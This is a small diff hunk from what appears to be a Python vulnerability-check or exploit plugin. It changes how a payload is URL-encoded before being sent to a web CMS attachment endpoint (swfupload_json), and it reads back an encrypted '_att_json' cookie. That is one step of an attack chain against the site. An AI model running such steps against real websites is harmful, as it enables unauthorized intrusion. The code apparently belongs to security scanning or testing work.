@@ -36,7 +36,7 @@ class P(T):
                 else:
                     return False
 
-            step2 = step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
+            step2 = step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, urllib.quote(payload))
             for c in requests.get(step2, cookies=cookies, timeout=timeout).cookies:
                 if c.name[-9:] == '_att_json':
                     enc_payload = c.value
